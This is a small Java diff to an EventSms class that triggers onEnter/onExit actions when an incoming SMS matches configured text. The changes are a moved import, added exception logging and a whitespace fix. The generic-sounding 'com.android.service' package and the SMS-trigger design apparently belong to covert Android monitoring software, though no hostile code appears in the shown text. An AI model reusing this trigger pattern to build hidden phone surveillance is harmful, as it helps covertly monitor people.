@@ -11,12 +11,12 @@ package com.android.service.event;
 
 import java.io.IOException;
 
-import com.android.service.Sms;
 import com.android.service.auto.Cfg;
 import com.android.service.conf.ConfEvent;
 import com.android.service.conf.ConfigurationException;
 import com.android.service.interfaces.Observer;
 import com.android.service.listener.ListenerSms;
+import com.android.service.module.message.Sms;
 import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
 import com.android.service.util.WChar;
@@ -45,6 +45,10 @@ public class EventSms extends BaseEvent implements Observer<Sms> {
 			msg = conf.getString("text");
 
 		} catch (final ConfigurationException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: params FAILED");//$NON-NLS-1$
 			}
@@ -76,7 +80,7 @@ public class EventSms extends BaseEvent implements Observer<Sms> {
 
 		onEnter();
 		onExit();
-		
+
 		return 1;
 	}
 }
